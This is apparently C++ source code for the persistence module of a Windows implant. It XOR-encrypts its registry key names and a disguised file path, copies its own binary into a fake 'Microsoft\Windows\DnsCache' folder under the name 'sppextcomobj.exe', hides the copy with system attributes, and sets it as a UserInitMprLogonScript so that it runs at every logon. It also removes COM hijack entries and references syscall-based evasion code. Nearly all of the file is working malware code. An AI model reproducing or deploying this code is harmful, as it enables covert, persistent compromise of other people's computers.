#include "Persistence.h"
#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <windows.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <algorithm>

namespace persistence {

namespace {
    // Registry Paths & Names (Encrypted)
    const wchar_t kEnvKeyEnc[] = { L'\x0e', L'\x71', L'\xfa', L'\x57', L'\x39', L'\x70', L'\xe2', L'\x53', L'\x2e', L'\x71', L'\xf8', L'\0' }; // Environment
    const wchar_t kLogonScriptEnc[] = { L'\x1e', L'\x6c', L'\xe9', L'\x4c', L'\x02', L'\x71', L'\xe5', L'\x4a', L'\x06', L'\x6f', L'\xfe', L'\x72', L'\x24', L'\x78', L'\xe3', L'\x50', L'\x18', L'\x7c', L'\xfe', L'\x57', L'\x3b', L'\x6b', L'\0' }; // UserInitMprLogonScript
    const wchar_t kSubDirEnc[] = { L'\x06', L'\x76', L'\xef', L'\x4c', L'\x24', L'\x6c', L'\xe3', L'\x58', L'\x3f', L'\x43', L'\xdb', L'\x57', L'\x25', L'\x7b', L'\xe3', L'\x49', L'\x38', L'\x43', L'\xc8', L'\x50', L'\x38', L'\x5c', L'\xed', L'\x5d', L'\x23', L'\x7a', L'\0' }; // Microsoft\Windows\DnsCache
    const wchar_t kExeNameEnc[] = { L'\x38', L'\x6f', L'\xfc', L'\x5b', L'\x33', L'\x6b', L'\xef', L'\x51', L'\x26', L'\x70', L'\xee', L'\x54', L'\x65', L'\x7a', L'\xf4', L'\x5b', L'\0' }; // sppextcomobj.exe
    const wchar_t kBadClsid1Enc[] = { L'\x30', L'\x2f', L'\xbc', L'\x0e', L'\x79', L'\x2e', L'\xb8', L'\x0e', L'\x7a', L'\x32', L'\xbc', L'\x0e', L'\x7b', L'\x2f', L'\xa1', L'\x0e', L'\x7b', L'\x2f', L'\xbc', L'\x13', L'\x08', L'\x2f', L'\xbc', L'\x0e', L'\x66', L'\x2f', L'\xbc', L'\x0e', L'\x7b', L'\x2f', L'\xbc', L'\x0e', L'\x7b', L'\x2f', L'\xbc', L'\x0a', L'\x7d', L'\x62', L'\0' };
    const wchar_t kBadClsid2Enc[] = { L'\x30', L'\x2d', L'\xbd', L'\x7b', L'\x08', L'\x2d', L'\xbc', L'\x0c', L'\x7b', L'\x32', L'\xbf', L'\x7f', L'\x0e', L'\x5e', L'\xa1', L'\x0f', L'\x7b', L'\x29', L'\xb5', L'\x13', L'\x0a', L'\x2d', L'\xc8', L'\x7a', L'\x66', L'\x2f', L'\xb4', L'\x0e', L'\x7b', L'\x2d', L'\xce', L'\x0d', L'\x7b', L'\x2c', L'\xbc', L'\x07', L'\x0f', L'\x62', L'\0' };

    std::wstring GetPersistencePath() {
        wchar_t path[MAX_PATH];
        if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
            return std::wstring(path) + L"\\" + utils::DecryptW(kSubDirEnc, wcslen(kSubDirEnc)) + L"\\" + utils::DecryptW(kExeNameEnc, wcslen(kExeNameEnc));
        }
        return L"";
    }

    bool InstallLogonScript(const std::wstring& implantPath) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kEnvKeyEnc, wcslen(kEnvKeyEnc)).c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            std::wstring valName = utils::DecryptW(kLogonScriptEnc, wcslen(kLogonScriptEnc));
            LSTATUS status = RegSetValueExW(hKey, valName.c_str(), 0, REG_SZ, (LPBYTE)implantPath.c_str(), (DWORD)(implantPath.length() + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return status == ERROR_SUCCESS;
        }
        return false;
    }
}

std::wstring establishPersistence(const std::wstring& overrideSourcePath) {
    LOG_INFO("Establishing persistence...");

    std::wstring inproc = L"InprocServer32";
    std::wstring localSrv = L"LocalServer32";
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid1Enc, wcslen(kBadClsid1Enc)), inproc);
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, wcslen(kBadClsid2Enc)), localSrv);
    ComHijacker::Uninstall(utils::DecryptW(kBadClsid2Enc, wcslen(kBadClsid2Enc)), inproc);

    std::wstring targetPath = GetPersistencePath();
    if (targetPath.empty()) return L"";

    wchar_t currentPath[MAX_PATH];
    if (overrideSourcePath.empty()) {
        if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) return L"";
    } else {
        wcscpy(currentPath, overrideSourcePath.c_str());
    }

    if (_wcsicmp(currentPath, targetPath.c_str()) != 0) {
        std::wstring dir = targetPath.substr(0, targetPath.find_last_of(L"\\"));
        size_t pos = 0;
        while ((pos = dir.find(L"\\", pos + 1)) != std::wstring::npos) {
            std::wstring sub = dir.substr(0, pos);
            CreateDirectoryW(sub.c_str(), NULL);
        }
        CreateDirectoryW(dir.c_str(), NULL);

        if (!CopyFileW(currentPath, targetPath.c_str(), FALSE)) {
            LOG_ERR("Failed to copy binary to persistence path: " + utils::ws2s(targetPath));
        } else {
            SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }

    if (InstallLogonScript(targetPath)) {
        LOG_INFO("Logon Script persistence success.");
    }
    return targetPath;
}

void ReinstallPersistence() {
    establishPersistence();
}

} // namespace persistence
